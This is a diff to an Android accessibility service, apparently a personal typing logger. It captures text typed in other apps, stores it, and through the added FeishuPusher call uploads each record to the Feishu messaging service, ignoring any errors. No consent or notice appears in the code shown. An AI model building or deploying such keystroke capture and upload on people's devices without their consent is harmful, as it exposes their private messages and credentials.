@@ -29,7 +29,7 @@ class TypingLogService : AccessibilityService() {
     private val labels = HashMap<String, String>()
 
     private val prefs: SharedPreferences
-        get() = getSharedPreferences(PREFS, MODE_PRIVATE)
+        get() = getSharedPreferences(Keys.PREFS, MODE_PRIVATE)
 
     private inner class Pending(
         val pkg: String,
@@ -49,7 +49,7 @@ class TypingLogService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        if (!prefs.getBoolean(KEY_ENABLED, true)) {
+        if (!prefs.getBoolean(Keys.ENABLED, true)) {
             pending.clear()
             return
         }
@@ -124,6 +124,13 @@ class TypingLogService : AccessibilityService() {
 
         val app = labelOf(pkg)
         val record = Record(now, pkg, app, text)
+
+        // 推送失败不影响本地记录
+        try {
+            FeishuPusher.submit(this, record)
+        } catch (_: Exception) {
+        }
+
         worker.execute {
             try {
                 LogStore.append(this, record)
@@ -156,8 +163,6 @@ class TypingLogService : AccessibilityService() {
     }
 
     companion object {
-        private const val PREFS = "config"
-        private const val KEY_ENABLED = "enabled"
         private const val IDLE_MS = 800L
         private const val SESSION_GAP_MS = 5 * 60 * 1000L
         private const val DEDUPE_MS = 3_000L
